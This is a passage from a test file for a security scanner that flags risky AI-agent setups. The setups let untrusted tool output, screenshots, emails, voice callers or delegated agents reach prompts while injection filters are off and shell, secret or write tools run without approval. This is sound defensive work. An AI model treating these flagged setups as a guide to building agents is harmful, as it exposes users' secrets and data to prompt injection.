    expect(JSON.stringify(runtimeContextComposerFindings[0])).not.toContain("customer_context_email");
    const runtimeContextEnvSecretFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-066");
    expect(runtimeContextEnvSecretFindings).toHaveLength(1);
    expect(runtimeContextEnvSecretFindings[0]?.matched_object.path).toBe("context/system-context.yaml");
    expect(runtimeContextEnvSecretFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_context_composer_config: true,
      agent_context_composer_untrusted_sources: true,
      agent_context_composer_env_materialization: true,
      agent_context_composer_secret_env_materialization: true,
      agent_context_composer_env_materialization_privileged_context: true,
      agent_context_composer_env_materialization_redaction_disabled: true,
      agent_context_composer_untrusted_env_selector: true,
      agent_context_composer_approval_required: false
    });
    expect(runtimeContextEnvSecretFindings[0]?.matched_object.metadata.agent_context_composer_env_materialization_target_categories).toEqual([
      "developer_prompt",
      "model_context",
      "system_prompt"
    ]);
    expect(runtimeContextEnvSecretFindings[0]?.matched_object.metadata.env_key_names).toEqual([
      "CONTEXT_COMPOSER_TOKEN",
      "CUSTOMER_SUCCESS_SLACK_BOT_TOKEN",
      "OPENAI_API_KEY",
      "SUPPORT_DB_PASSWORD"
    ]);
    expect(runtimeContextEnvSecretFindings[0]?.severity).toBe("critical");
    expect(runtimeContextEnvSecretFindings[0]?.confidence).toBe("very_high");
    expect(runtimeContextEnvSecretFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeContextEnvSecretFindings[0])).not.toContain("${CONTEXT_COMPOSER_TOKEN}");
    expect(JSON.stringify(runtimeContextEnvSecretFindings[0])).not.toContain("${CUSTOMER_SUCCESS_SLACK_BOT_TOKEN}");
    expect(JSON.stringify(runtimeContextEnvSecretFindings[0])).not.toContain("${OPENAI_API_KEY}");
    expect(JSON.stringify(runtimeContextEnvSecretFindings[0])).not.toContain("${SUPPORT_DB_PASSWORD}");
    expect(JSON.stringify(runtimeContextEnvSecretFindings[0])).not.toContain("customer_requested_env_key");
    expect(JSON.stringify(runtimeContextEnvSecretFindings[0])).not.toContain("customer_ticket_message");
    expect(JSON.stringify(runtimeContextEnvSecretFindings[0])).not.toContain("retrieved_account_context");
    expect(JSON.stringify(runtimeContextEnvSecretFindings[0])).not.toContain("support_db.update_customer_record");
    const runtimeToolOutputFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-039");
    expect(runtimeToolOutputFindings).toHaveLength(1);
    expect(runtimeToolOutputFindings[0]?.matched_object.path).toBe("tool-results/result-policy.yaml");
    expect(runtimeToolOutputFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_tool_output_policy_config: true,
      tool_output_untrusted_sources: true,
      tool_output_raw_output_enabled: true,
      tool_output_prompt_context: true,
      tool_output_sanitization_disabled: true,
      tool_output_prompt_injection_filter_disabled: true,
      tool_output_followup_tool_calls: true,
      tool_output_write_authority: true,
      tool_output_external_reach: true,
      tool_output_memory_write: true,
      tool_output_shell_authority: true,
      tool_output_destructive_authority: true,
      tool_output_approval_required: false
    });
    expect(runtimeToolOutputFindings[0]?.matched_object.metadata.tool_output_tool_authority_categories).toEqual([
      "database_access",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "shell_execution",
      "tool_call"
    ]);
    expect(runtimeToolOutputFindings[0]?.severity).toBe("critical");
    expect(runtimeToolOutputFindings[0]?.confidence).toBe("very_high");
    expect(runtimeToolOutputFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeToolOutputFindings[0])).not.toContain("${TOOL_OUTPUT_POLICY_TOKEN}");
    expect(JSON.stringify(runtimeToolOutputFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeToolOutputFindings[0])).not.toContain("shell_command_output");
    expect(JSON.stringify(runtimeToolOutputFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeToolOutputFindings[0])).not.toContain("slack.post_escalation_reply");
    expect(JSON.stringify(runtimeToolOutputFindings[0])).not.toContain("tool_output_customer_email");
    const runtimeToolOutputApprovalFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-079"
    );
    expect(runtimeToolOutputApprovalFindings).toHaveLength(1);
    expect(runtimeToolOutputApprovalFindings[0]?.matched_object.path).toBe("tool-results/result-policy.yaml");
    expect(runtimeToolOutputApprovalFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_tool_output_policy_config: true,
      tool_output_untrusted_sources: true,
      tool_output_raw_output_enabled: true,
      tool_output_system_or_developer_context: true,
      tool_output_approval_input: true,
      tool_output_sanitization_disabled: true,
      tool_output_prompt_injection_filter_disabled: true,
      tool_output_delimiter_disabled: true,
      tool_output_followup_tool_calls: true,
      tool_output_write_authority: true,
      tool_output_external_reach: true,
      tool_output_secret_access: true,
      tool_output_approval_required: false
    });
    expect(runtimeToolOutputApprovalFindings[0]?.matched_object.metadata.tool_output_source_categories).toEqual([
      "api_response",
      "browser_output",
      "database_result",
      "mcp_result",
      "shell_output"
    ]);
    expect(runtimeToolOutputApprovalFindings[0]?.matched_object.metadata.tool_output_tool_authority_categories).toEqual([
      "database_access",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "shell_execution",
      "tool_call"
    ]);
    expect(runtimeToolOutputApprovalFindings[0]?.severity).toBe("critical");
    expect(runtimeToolOutputApprovalFindings[0]?.confidence).toBe("very_high");
    expect(runtimeToolOutputApprovalFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeToolOutputApprovalFindings[0])).not.toContain("${TOOL_OUTPUT_POLICY_TOKEN}");
    expect(JSON.stringify(runtimeToolOutputApprovalFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeToolOutputApprovalFindings[0])).not.toContain("shell_command_output");
    expect(JSON.stringify(runtimeToolOutputApprovalFindings[0])).not.toContain("mcp_filesystem_result");
    expect(JSON.stringify(runtimeToolOutputApprovalFindings[0])).not.toContain("api_connector_response");
    expect(JSON.stringify(runtimeToolOutputApprovalFindings[0])).not.toContain("customer_uploaded_html");
    expect(JSON.stringify(runtimeToolOutputApprovalFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeToolOutputApprovalFindings[0])).not.toContain("slack.post_escalation_reply");
    expect(JSON.stringify(runtimeToolOutputApprovalFindings[0])).not.toContain("memory.write_long_term_summary");
    expect(JSON.stringify(runtimeToolOutputApprovalFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimeToolOutputApprovalFindings[0])).not.toContain("tool_output_customer_email");
    expect(JSON.stringify(runtimeToolOutputApprovalFindings[0])).not.toContain("tool_output_account_number");
    expect(JSON.stringify(runtimeToolOutputApprovalFindings[0])).not.toContain("confidential_tool_trace");
    const runtimeVisualContextFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-040");
    expect(runtimeVisualContextFindings).toHaveLength(1);
    expect(runtimeVisualContextFindings[0]?.matched_object.path).toBe("vision/screenshot-policy.yaml");
    expect(runtimeVisualContextFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_visual_context_policy_config: true,
      visual_context_untrusted_sources: true,
      visual_context_raw_image_enabled: true,
      visual_context_ocr_enabled: true,
      visual_context_prompt_context: true,
      visual_context_sanitization_disabled: true,
      visual_context_prompt_injection_filter_disabled: true,
      visual_context_followup_tool_calls: true,
      visual_context_write_authority: true,
      visual_context_external_reach: true,
      visual_context_memory_write: true,
      visual_context_shell_authority: true,
      visual_context_destructive_authority: true,
      visual_context_approval_required: false
    });
    expect(runtimeVisualContextFindings[0]?.matched_object.metadata.visual_context_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "shell_execution",
      "tool_call"
    ]);
    expect(runtimeVisualContextFindings[0]?.severity).toBe("critical");
    expect(runtimeVisualContextFindings[0]?.confidence).toBe("very_high");
    expect(runtimeVisualContextFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeVisualContextFindings[0])).not.toContain("${VISION_CONTEXT_TOKEN}");
    expect(JSON.stringify(runtimeVisualContextFindings[0])).not.toContain("browser_screenshot_observation");
    expect(JSON.stringify(runtimeVisualContextFindings[0])).not.toContain("customer_uploaded_invoice_image");
    expect(JSON.stringify(runtimeVisualContextFindings[0])).not.toContain("ocr_text_from_support_attachment");
    expect(JSON.stringify(runtimeVisualContextFindings[0])).not.toContain("browser.submit_customer_form");
    expect(JSON.stringify(runtimeVisualContextFindings[0])).not.toContain("visual_customer_email");
    const runtimeVisualToolExecutionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-095");
    expect(runtimeVisualToolExecutionFindings).toHaveLength(1);
    expect(runtimeVisualToolExecutionFindings[0]?.matched_object.path).toBe("vision/screenshot-policy.yaml");
    expect(runtimeVisualToolExecutionFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_visual_context_policy_config: true,
      visual_context_untrusted_sources: true,
      visual_context_raw_image_enabled: true,
      visual_context_ocr_enabled: true,
      visual_context_prompt_context: true,
      visual_context_system_or_developer_context: true,
      visual_context_boundary_disabled: true,
      visual_context_sanitization_disabled: true,
      visual_context_prompt_injection_filter_disabled: true,
      visual_context_approval_input: true,
      visual_context_followup_tool_calls: true,
      visual_context_write_authority: true,
      visual_context_external_reach: true,
      visual_context_memory_write: true,
      visual_context_shell_authority: true,
      visual_context_destructive_authority: true,
      visual_context_secret_capture: true,
      visual_context_secret_access: true,
      visual_context_sensitive_data: true,
      visual_context_pii_data: true,
      visual_context_approval_required: false
    });
    expect(runtimeVisualToolExecutionFindings[0]?.matched_object.metadata.visual_context_source_categories).toEqual([
      "browser_screenshot",
      "document_image",
      "ocr_text",
      "screen_capture",
      "uploaded_image"
    ]);
    expect(runtimeVisualToolExecutionFindings[0]?.matched_object.metadata.visual_context_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "shell_execution",
      "tool_call"
    ]);
    expect(runtimeVisualToolExecutionFindings[0]?.severity).toBe("critical");
    expect(runtimeVisualToolExecutionFindings[0]?.confidence).toBe("very_high");
    expect(runtimeVisualToolExecutionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeVisualToolExecutionFindings[0])).not.toContain("${VISION_CONTEXT_TOKEN}");
    expect(JSON.stringify(runtimeVisualToolExecutionFindings[0])).not.toContain("browser_screenshot_observation");
    expect(JSON.stringify(runtimeVisualToolExecutionFindings[0])).not.toContain("screen_capture_after_navigation");
    expect(JSON.stringify(runtimeVisualToolExecutionFindings[0])).not.toContain("customer_uploaded_invoice_image");
    expect(JSON.stringify(runtimeVisualToolExecutionFindings[0])).not.toContain("ocr_text_from_support_attachment");
    expect(JSON.stringify(runtimeVisualToolExecutionFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeVisualToolExecutionFindings[0])).not.toContain("slack.post_escalation_reply");
    expect(JSON.stringify(runtimeVisualToolExecutionFindings[0])).not.toContain("browser.submit_customer_form");
    expect(JSON.stringify(runtimeVisualToolExecutionFindings[0])).not.toContain("memory.write_long_term_summary");
    expect(JSON.stringify(runtimeVisualToolExecutionFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimeVisualToolExecutionFindings[0])).not.toContain("visual_customer_email");
    expect(JSON.stringify(runtimeVisualToolExecutionFindings[0])).not.toContain("visual_account_number");
    expect(JSON.stringify(runtimeVisualToolExecutionFindings[0])).not.toContain("confidential_invoice_image");
    const runtimeInboundTriggerFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-014");
    expect(runtimeInboundTriggerFindings).toHaveLength(1);
    expect(runtimeInboundTriggerFindings[0]?.matched_object.path).toBe("inbox/support-triage.yaml");
    expect(runtimeInboundTriggerFindings[0]?.matched_object.metadata).toMatchObject({
      inbound_trigger_provider: "gmail",
      inbound_trigger_external_source: true,
      inbound_trigger_invokes_agent: true,
      inbound_trigger_invokes_tools: true,
      inbound_trigger_write_authority: true,
      inbound_trigger_external_response: true,
      inbound_trigger_memory_write: true,
      inbound_trigger_approval_required: false
    });
    expect(runtimeInboundTriggerFindings[0]?.matched_object.metadata.inbound_trigger_source_categories).toEqual([
      "chat_message",
      "email_message",
      "ticket_comment",
      "webhook_payload"
    ]);
    expect(runtimeInboundTriggerFindings[0]?.matched_object.metadata.inbound_trigger_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "state_write",
      "tool_call"
    ]);
    expect(runtimeInboundTriggerFindings[0]?.severity).toBe("critical");
    expect(runtimeInboundTriggerFindings[0]?.confidence).toBe("very_high");
    expect(runtimeInboundTriggerFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeInboundTriggerFindings[0])).not.toContain("${SUPPORT_INBOX_TOKEN}");
    expect(JSON.stringify(runtimeInboundTriggerFindings[0])).not.toContain("mail-router.example.invalid");
    expect(JSON.stringify(runtimeInboundTriggerFindings[0])).not.toContain("secops-support@example.invalid");
    expect(JSON.stringify(runtimeInboundTriggerFindings[0])).not.toContain("support-triage-agent");
    const runtimeInboundAttachmentFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-094");
    expect(runtimeInboundAttachmentFindings).toHaveLength(1);
    expect(runtimeInboundAttachmentFindings[0]?.matched_object.path).toBe("inbox/support-triage.yaml");
    expect(runtimeInboundAttachmentFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_inbound_trigger_config: true,
      inbound_trigger_provider: "gmail",
      inbound_trigger_external_source: true,
      inbound_trigger_invokes_agent: true,
      inbound_trigger_invokes_tools: true,
      inbound_trigger_attachment_context: true,
      inbound_trigger_write_authority: true,
      inbound_trigger_external_response: true,
      inbound_trigger_memory_write: true,
      inbound_trigger_sensitive_context: true,
      inbound_trigger_pii_context: true,
      inbound_trigger_approval_required: false
    });
    expect(runtimeInboundAttachmentFindings[0]?.matched_object.metadata.inbound_trigger_payload_categories).toEqual([
      "attachment",
      "message_body",
      "message_title",
      "sender_identity"
    ]);
    expect(runtimeInboundAttachmentFindings[0]?.matched_object.metadata.inbound_trigger_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "state_write",
      "tool_call"
    ]);
    expect(runtimeInboundAttachmentFindings[0]?.severity).toBe("critical");
    expect(runtimeInboundAttachmentFindings[0]?.confidence).toBe("very_high");
    expect(runtimeInboundAttachmentFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("${SUPPORT_INBOX_TOKEN}");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("mail-router.example.invalid");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("secops-support@example.invalid");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("support-triage-agent");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("message.body");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("support mailbox");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("inbound customer email");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("slack escalation message");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("ticket comment");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("sender_email");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("customer_account_id");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("support_db");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("slack_reply");
    expect(JSON.stringify(runtimeInboundAttachmentFindings[0])).not.toContain("vault_secret_lookup");
    const runtimeHostedAssistantFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-042");
    expect(runtimeHostedAssistantFindings).toHaveLength(1);
    expect(runtimeHostedAssistantFindings[0]?.matched_object.path).toBe("assistants/support-assistant.yaml");
    expect(runtimeHostedAssistantFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_hosted_assistant_config: true,
      hosted_assistant_provider: "openai_assistants",
      hosted_assistant_definition_detected: true,
      hosted_assistant_untrusted_input: true,
      hosted_assistant_privileged_tools: true,
      hosted_assistant_sensitive_context: true,
      hosted_assistant_tool_choice_auto: true,
      hosted_assistant_approval_required: false
    });
    expect(runtimeHostedAssistantFindings[0]?.matched_object.metadata.hosted_assistant_tool_categories).toEqual([
      "code_interpreter",
      "external_response",
      "file_search",
      "function_tool",
      "memory_write",
      "state_write"
    ]);
    expect(runtimeHostedAssistantFindings[0]?.severity).toBe("critical");
    expect(runtimeHostedAssistantFindings[0]?.confidence).toBe("very_high");
    expect(runtimeHostedAssistantFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeHostedAssistantFindings[0])).not.toContain("${OPENAI_ASSISTANT_TOKEN}");
    expect(JSON.stringify(runtimeHostedAssistantFindings[0])).not.toContain("asst_support_ops_redacted_by_scanner");
    expect(JSON.stringify(runtimeHostedAssistantFindings[0])).not.toContain("customer-remediation-assistant");
    expect(JSON.stringify(runtimeHostedAssistantFindings[0])).not.toContain("gpt-4.1");
    expect(JSON.stringify(runtimeHostedAssistantFindings[0])).not.toContain("update_customer_record");
    expect(JSON.stringify(runtimeHostedAssistantFindings[0])).not.toContain("post_support_slack_reply");
    expect(JSON.stringify(runtimeHostedAssistantFindings[0])).not.toContain("file_support_private_case_notes");
    expect(JSON.stringify(runtimeHostedAssistantFindings[0])).not.toContain("vs_customer_support_private");
    expect(JSON.stringify(runtimeHostedAssistantFindings[0])).not.toContain("customer_email_address");
    const runtimeHostedAssistantFanoutFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-049");
    expect(runtimeHostedAssistantFanoutFindings).toHaveLength(1);
    expect(runtimeHostedAssistantFanoutFindings[0]?.matched_object.path).toBe("assistants/support-assistant.yaml");
    expect(runtimeHostedAssistantFanoutFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_hosted_assistant_config: true,
      hosted_assistant_provider: "openai_assistants",
      hosted_assistant_definition_detected: true,
      hosted_assistant_untrusted_input: true,
      hosted_assistant_tool_choice_auto: true,
      hosted_assistant_parallel_tool_calls: true,
      hosted_assistant_parallel_privileged_tool_fanout: true,
      hosted_assistant_privileged_tool_category_count: 4,
      hosted_assistant_code_interpreter_enabled: true,
      hosted_assistant_function_tools_enabled: true,
      hosted_assistant_tool_resources_redacted: true,
      hosted_assistant_guardrails_disabled: true,
      hosted_assistant_approval_required: false
    });
    expect(runtimeHostedAssistantFanoutFindings[0]?.severity).toBe("critical");
    expect(runtimeHostedAssistantFanoutFindings[0]?.confidence).toBe("very_high");
    expect(runtimeHostedAssistantFanoutFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeHostedAssistantFanoutFindings[0])).not.toContain("${OPENAI_ASSISTANT_TOKEN}");
    expect(JSON.stringify(runtimeHostedAssistantFanoutFindings[0])).not.toContain("asst_support_ops_redacted_by_scanner");
    expect(JSON.stringify(runtimeHostedAssistantFanoutFindings[0])).not.toContain("customer-remediation-assistant");
    expect(JSON.stringify(runtimeHostedAssistantFanoutFindings[0])).not.toContain("gpt-4.1");
    expect(JSON.stringify(runtimeHostedAssistantFanoutFindings[0])).not.toContain("update_customer_record");
    expect(JSON.stringify(runtimeHostedAssistantFanoutFindings[0])).not.toContain("post_support_slack_reply");
    expect(JSON.stringify(runtimeHostedAssistantFanoutFindings[0])).not.toContain("file_support_private_case_notes");
    expect(JSON.stringify(runtimeHostedAssistantFanoutFindings[0])).not.toContain("vs_customer_support_private");
    expect(JSON.stringify(runtimeHostedAssistantFanoutFindings[0])).not.toContain("customer_email_address");
    const runtimeRealtimeAgentFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-043");
    expect(runtimeRealtimeAgentFindings).toHaveLength(1);
    expect(runtimeRealtimeAgentFindings[0]?.matched_object.path).toBe("realtime/support-voice-agent.yaml");
    expect(runtimeRealtimeAgentFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_realtime_agent_session_config: true,
      realtime_agent_provider: "openai_realtime",
      realtime_agent_external_caller: true,
      realtime_agent_voice_or_audio_input: true,
      realtime_agent_transcript_capture: true,
      realtime_agent_recording_enabled: true,
      realtime_agent_recording_redaction_disabled: true,
      realtime_agent_transcript_sanitization_disabled: true,
      realtime_agent_prompt_injection_filter_disabled: true,
      realtime_agent_tool_calls_enabled: true,
      realtime_agent_privileged_tool_authority: true,
      realtime_agent_write_authority: true,
      realtime_agent_external_response: true,
      realtime_agent_memory_write: true,
      realtime_agent_sensitive_context: true,
      realtime_agent_pii_context: true,
      realtime_agent_secret_exposure: true,
      realtime_agent_approval_required: false
    });
    expect(runtimeRealtimeAgentFindings[0]?.matched_object.metadata.realtime_agent_destination_kinds).toEqual([
      "realtime_provider",
      "telephony_provider",
      "websocket_endpoint"
    ]);
    expect(runtimeRealtimeAgentFindings[0]?.matched_object.metadata.realtime_agent_tool_authority_categories).toEqual([
      "external_response",
      "memory_write",
      "secret_manager_access",
      "state_write",
      "tool_call"
    ]);
    expect(runtimeRealtimeAgentFindings[0]?.severity).toBe("critical");
    expect(runtimeRealtimeAgentFindings[0]?.confidence).toBe("very_high");
    expect(runtimeRealtimeAgentFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeRealtimeAgentFindings[0])).not.toContain("${REALTIME_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeRealtimeAgentFindings[0])).not.toContain("${TWILIO_AUTH_TOKEN}");
    expect(JSON.stringify(runtimeRealtimeAgentFindings[0])).not.toContain("realtime.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeRealtimeAgentFindings[0])).not.toContain("gpt-4o-realtime-preview");
    expect(JSON.stringify(runtimeRealtimeAgentFindings[0])).not.toContain("realtime_update_customer_record");
    expect(JSON.stringify(runtimeRealtimeAgentFindings[0])).not.toContain("realtime_send_sms_reply");
    expect(JSON.stringify(runtimeRealtimeAgentFindings[0])).not.toContain("realtime_secret_lookup");
    expect(JSON.stringify(runtimeRealtimeAgentFindings[0])).not.toContain("pstn_customer_phone");
    expect(JSON.stringify(runtimeRealtimeAgentFindings[0])).not.toContain("anonymous_support_caller");
    const runtimeRealtimeRecordingFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-069");
    expect(runtimeRealtimeRecordingFindings).toHaveLength(1);
    expect(runtimeRealtimeRecordingFindings[0]?.matched_object.path).toBe("realtime/support-voice-agent.yaml");
    expect(runtimeRealtimeRecordingFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_realtime_agent_session_config: true,
      realtime_agent_external_caller: true,
      realtime_agent_voice_or_audio_input: true,
      realtime_agent_transcript_capture: true,
      realtime_agent_recording_enabled: true,
      realtime_agent_recording_redaction_disabled: true,
      realtime_agent_transcript_sanitization_disabled: true,
      realtime_agent_sensitive_context: true,
      realtime_agent_pii_context: true,
      realtime_agent_approval_required: false
    });
    expect(runtimeRealtimeRecordingFindings[0]?.severity).toBe("critical");
    expect(runtimeRealtimeRecordingFindings[0]?.confidence).toBe("very_high");
    expect(runtimeRealtimeRecordingFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeRealtimeRecordingFindings[0])).not.toContain("support_voice_recordings_private");
    expect(JSON.stringify(runtimeRealtimeRecordingFindings[0])).not.toContain("realtime_caller_phone_number");
    expect(JSON.stringify(runtimeRealtimeRecordingFindings[0])).not.toContain("realtime_customer_account_id");
    expect(JSON.stringify(runtimeRealtimeRecordingFindings[0])).not.toContain("confidential_live_support_notes");
    const runtimeRealtimeCallerToolRecordingFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-111");
    expect(runtimeRealtimeCallerToolRecordingFindings).toHaveLength(1);
    expect(runtimeRealtimeCallerToolRecordingFindings[0]?.matched_object.path).toBe("realtime/support-voice-agent.yaml");
    expect(runtimeRealtimeCallerToolRecordingFindings[0]?.matched_object.data_classes).toEqual([
      "confidential",
      "credential",
      "pii",
      "secret"
    ]);
    expect(runtimeRealtimeCallerToolRecordingFindings[0]?.matched_object.actions).toEqual([
      "call",
      "execute",
      "publish",
      "read",
      "remember",
      "send",
      "write"
    ]);
    expect(runtimeRealtimeCallerToolRecordingFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_realtime_agent_session_config: true,
      realtime_agent_external_caller: true,
      realtime_agent_voice_or_audio_input: true,
      realtime_agent_transcript_capture: true,
      realtime_agent_recording_enabled: true,
      realtime_agent_recording_redaction_disabled: true,
      realtime_agent_transcript_sanitization_disabled: true,
      realtime_agent_prompt_injection_filter_disabled: true,
      realtime_agent_tool_calls_enabled: true,
      realtime_agent_privileged_tool_authority: true,
      realtime_agent_write_authority: true,
      realtime_agent_external_response: true,
      realtime_agent_memory_write: true,
      realtime_agent_secret_exposure: true,
      realtime_agent_approval_required: false
    });
    expect(runtimeRealtimeCallerToolRecordingFindings[0]?.matched_object.metadata.realtime_agent_tool_authority_categories).toEqual([
      "external_response",
      "memory_write",
      "secret_manager_access",
      "state_write",
      "tool_call"
    ]);
    expect(runtimeRealtimeCallerToolRecordingFindings[0]?.severity).toBe("critical");
    expect(runtimeRealtimeCallerToolRecordingFindings[0]?.confidence).toBe("very_high");
    expect(runtimeRealtimeCallerToolRecordingFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeRealtimeCallerToolRecordingFindings[0])).not.toContain("${REALTIME_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeRealtimeCallerToolRecordingFindings[0])).not.toContain("${TWILIO_AUTH_TOKEN}");
    expect(JSON.stringify(runtimeRealtimeCallerToolRecordingFindings[0])).not.toContain("realtime.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeRealtimeCallerToolRecordingFindings[0])).not.toContain("gpt-4o-realtime-preview");
    expect(JSON.stringify(runtimeRealtimeCallerToolRecordingFindings[0])).not.toContain("realtime_update_customer_record");
    expect(JSON.stringify(runtimeRealtimeCallerToolRecordingFindings[0])).not.toContain("realtime_send_sms_reply");
    expect(JSON.stringify(runtimeRealtimeCallerToolRecordingFindings[0])).not.toContain("realtime_secret_lookup");
    expect(JSON.stringify(runtimeRealtimeCallerToolRecordingFindings[0])).not.toContain("pstn_customer_phone");
    expect(JSON.stringify(runtimeRealtimeCallerToolRecordingFindings[0])).not.toContain("anonymous_support_caller");
    expect(JSON.stringify(runtimeRealtimeCallerToolRecordingFindings[0])).not.toContain("support_voice_recordings_private");
    expect(JSON.stringify(runtimeRealtimeCallerToolRecordingFindings[0])).not.toContain("realtime_caller_phone_number");
    expect(JSON.stringify(runtimeRealtimeCallerToolRecordingFindings[0])).not.toContain("realtime_customer_account_id");
    expect(JSON.stringify(runtimeRealtimeCallerToolRecordingFindings[0])).not.toContain("confidential_live_support_notes");
    const runtimeAgentOrchestrationFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-015");
    expect(runtimeAgentOrchestrationFindings).toHaveLength(1);
    expect(runtimeAgentOrchestrationFindings[0]?.matched_object.path).toBe("agents/support-crew.yaml");
    expect(runtimeAgentOrchestrationFindings[0]?.matched_object.metadata).toMatchObject({
      agent_orchestration_framework: "crewai",
      agent_orchestration_multi_agent: true,
      agent_orchestration_agent_count: 2,
      agent_orchestration_delegation_enabled: true,
      agent_orchestration_untrusted_input: true,
      agent_orchestration_shared_memory: true,
      agent_orchestration_invokes_tools: true,
      agent_orchestration_privileged_agent: true,
      agent_orchestration_write_authority: true,
      agent_orchestration_external_authority: true,
      agent_orchestration_secret_authority: true,
      agent_orchestration_approval_required: false
    });
    expect(runtimeAgentOrchestrationFindings[0]?.matched_object.metadata.agent_orchestration_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "repo_or_filesystem_write",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeAgentOrchestrationFindings[0]?.severity).toBe("critical");
    expect(runtimeAgentOrchestrationFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAgentOrchestrationFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeAgentOrchestrationFindings[0])).not.toContain("${CREW_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeAgentOrchestrationFindings[0])).not.toContain("support-escalation-crew");
    expect(JSON.stringify(runtimeAgentOrchestrationFindings[0])).not.toContain("production-support-memory");
    expect(JSON.stringify(runtimeAgentOrchestrationFindings[0])).not.toContain("operations-executor");
    const runtimeAgentOrchestrationMemoryFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-080"
    );
    expect(runtimeAgentOrchestrationMemoryFindings).toHaveLength(1);
    expect(runtimeAgentOrchestrationMemoryFindings[0]?.matched_object.path).toBe("agents/support-crew.yaml");
    expect(runtimeAgentOrchestrationMemoryFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_orchestration_config: true,
      agent_orchestration_framework: "crewai",
      agent_orchestration_multi_agent: true,
      agent_orchestration_agent_count: 2,
      agent_orchestration_delegation_enabled: true,
      agent_orchestration_untrusted_input: true,
      agent_orchestration_shared_memory: true,
      agent_orchestration_memory_redacted: true,
      agent_orchestration_invokes_tools: true,
      agent_orchestration_privileged_agent: true,
      agent_orchestration_write_authority: true,
      agent_orchestration_external_authority: true,
      agent_orchestration_secret_authority: true,
      agent_orchestration_approval_required: false
    });
    expect(
      runtimeAgentOrchestrationMemoryFindings[0]?.matched_object.metadata.agent_orchestration_delegation_categories
